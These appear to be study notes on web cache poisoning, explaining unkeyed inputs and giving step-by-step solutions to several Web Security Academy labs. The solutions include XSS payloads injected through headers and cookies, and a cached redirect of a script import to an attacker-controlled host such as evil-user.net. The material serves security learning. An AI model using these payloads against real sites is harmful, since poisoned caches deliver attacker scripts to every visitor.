## Cache keys
When the cache receives an HTTP request, it first has to determine whether there is a cached response that it can serve directly, or whether it has to forward the request for handling by the back-end server. Caches identify equivalent requests by comparing a predefined subset of the request's components, known collectively as the "cache key". Typically, this would contain the request line and Host header. Components of the request that are not included in the cache key are said to be "unkeyed"

If the cache key of an incoming request matches the key of a previous request, then the cache considers them to be equivalent. As a result, it will serve a copy of the cached response that was generated for the original request. This applies to all subsequent requests with the matching cache key, until the cached response expires.

Crucially, the other components of the request are ignored altogether by the cache. We'll explore the impact of this behavior in more detail later. 

## Constructing a web cache poisoning attack
## Identify and evaluate unkeyed inputs
Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers. Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. Therefore, the first step when constructing a web cache poisoning attack is identifying unkeyed inputs that are supported by the server

You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. This can be obvious, such as reflecting the input in the response directly, or triggering an entirely different response. However, sometimes the effects are more subtle and require a bit of detective work to figure out. You can use tools such as Burp Comparer to compare the response with and without the injected input, but this still involves a significant amount of manual effort

## Param Miner
Fortunately, you can automate the process of identifying unkeyed inputs by adding the Param Miner extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers. If a request containing one of its injected inputs has an effect on the response, Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the "Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite Community Edition. 

**Caution**: When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request

## Elicit a harmful response from the back-end server
Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. 

## Get the response cached
Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless you can cause the response to be cached, which can sometimes be tricky.

Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims. 

## Exploiting cache design flaws
## Using web cache poisoning to deliver an XSS attack
Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.

For example, consider the following request and response: 
```bash
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. Crucially for web cache poisoning, the X-Forwarded-Host header is often unkeyed. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload: 
```bash
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```
If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload.

## Using web cache poisoning to exploit unsafe handling of resource imports
Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead.

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key. 
```bash
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

### PRACTITIONER Lab: Web cache poisoning with an unkeyed header
We have the request, response of which is stored in the caching server:
```bash
GET / HTTP/2
Host: 0af7001b03b35e6b846c50ff00aa0052.web-security-academy.net
Cookie: session=MRmq8tYlBPTP2VvotLEbcZ7LniTGPZh9
```

In the response we get:
```bash
    <body>
        <script type="text/javascript" src="//0af7001b03b35e6b846c50ff00aa0052.web-security-academy.net/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
            ...
```

What's interesting is that we can add `X-Forwarded-Host` header to the request, and its value is reflected in the response html so if we add `X-Forwarded-Host: VVVVV` to the request, we'll get the following response:
```bash
    <body>
        <script type="text/javascript" src="//VVVVV/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
            ...
```

So we add the following to the request:
```bash
X-Forwarded-Host: "></script><script>alert(document.cookie)</script>
```

And the response is cached by the caching server, but the response also contains our injected js code:
```bash
   <body>
        <script type="text/javascript" src="//"></script><script>alert(document.cookie)</script>/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
            ...
```
So when users visit this page, they'll get the page from the poisoned cache and the js code will be executed

By the way in order to find 


It's important to note that this solution does not involve cache buster (search explanation above)
Official lab's solution introduces the usage of cache buster so it's included here:
- In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater
- Add a **cache-buster** query parameter, such as `?cb=1234`
- Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request.
- Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.
- Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.
- Go to the exploit server and change the file name to match the path used by the vulnerable response:
```
/resources/js/tracking.js
```
- In the body, enter the payload alert(document.cookie) and store the exploit.
- Open the GET request for the home page in Burp Repeater and remove the cache buster.
- Add the following header, remembering to enter your own exploit server ID:
```bash
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```
- Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
- To simulate the victim, load the poisoned URL in the browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
- If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved. 

## Using web cache poisoning to exploit cookie-handling vulnerabilities
Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page: 
```bash
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

In this example, the Polish version of a blog post is being requested. Notice that the information about which language version to serve is only contained in the Cookie header. Let's suppose that the cache key contains the request line and the Host header, but not the Cookie header. In this case, if the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish version as well, regardless of which language they actually selected.

This flawed handling of cookies by the cache can also be exploited using web cache poisoning techniques. In practice, however, this vector is relatively rare in comparison to header-based cache poisoning. When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache. 

### PRACTITIONER Lab: Web cache poisoning with an unkeyed cookie
The value of cookies aren't included in the cache key. But we know that GET / page is cached.

When we make a request:
```bash
GET / HTTP/2
Host: labid.web-security-academy.net
Cookie: fehost=VVVV
```

We see the value of `fehost` cookie reflected in the response html:
```bash
       <script>
            data = {"host":"0aa2008d0413718a80350d0a0061004a.web-security-academy.net","path":"/","frontend":"VVVV"}
        </script>
```

We can therefore poison the web cache with the following request:
```bash
GET / HTTP/2
Host: labid.web-security-academy.net
Cookie: fehost="}%3balert(1)%20//
```

And in the response we'll get:
```bash
        <script>
            data = {"host":"labid.web-security-academy.net","path":"/","frontend":""};alert(1) //"}
        </script>
```

Now that response is cached and when other users visit the page, the js code will be executed


## Using multiple headers to exploit web cache poisoning vulnerabilities
Some websites are vulnerable to simple web cache poisoning exploits, as demonstrated above. However, others require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates multiple unkeyed inputs.

For example, let's say a website requires secure communication using HTTPS. To enforce this, if a request that uses another protocol is received, the website dynamically generates a redirect to itself that does use HTTPS: 

```bash
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

By itself, this behavior isn't necessarily vulnerable. However, by combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, an attacker could potentially exploit this behavior to generate a cacheable response that redirects users to a malicious URL

### PRACTITIONER Lab: Web cache poisoning with multiple headers
- Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request which is cached. In this lab the JavaScript file /resources/js/tracking.js is cached. Send it to Burp Repeater.

- Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response
Request:
```bash
GET /resources/js/tracking.js?cb=1234 HTTP/2
X-Forwarded-Host: example.com
Host: 0a41002b03d774ae80b2179300c300f2.web-security-academy.net
```
Response:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

- Remove the X-Forwarded-Host header and add the X-Forwarded-Scheme header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://
Request:
```bash
GET /resources/js/tracking.js?cb=1234 HTTP/2
Host: 0a41002b03d774ae80b2179300c300f2.web-security-academy.net
X-Forwarded-Scheme: http
```
Response:
```bash
HTTP/2 302 Found
Location: https://0a41002b03d774ae80b2179300c300f2.web-security-academy.net/resources/js/tracking.js?cb=1234
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```
Important to note that the redirect that we got from the server is cached. Which means we can poison the cache with a redirect to our own server. And later other users will get this cached response (which is a redirect to our own server)

- Add the X-Forwarded-Host: example.com header back to the request, but keep X-Forwarded-Scheme: nothttps as well. Send this request and notice that the Location header of the 302 redirect now points to https://example.com/
Request:
```bash
GET /resources/js/tracking.js?cb=1234 HTTP/2
Host: 0a41002b03d774ae80b2179300c300f2.web-security-academy.net
X-Forwarded-Host: example.com
X-Forwarded-Scheme: http
```
Response:
```bash
HTTP/2 302 Found
Location: https://example.com/resources/js/tracking.js?cb=1234
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

- Go to the exploit server (or the server that you control) and change the file name to match the path used by the vulnerable response:
```bash
/resources/js/tracking.js
```
- In the response body, enter the payload `alert(document.cookie)` and store the exploit. 

- Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID: 
```bash
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

- Make sure the X-Forwarded-Scheme header is set to anything other than HTTPS

- Send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.

- To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser. If the cache was successfully poisoned, you will see the script containing your payload, alert(document.cookie). Note that the alert() won't actually execute here.

- Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again. 


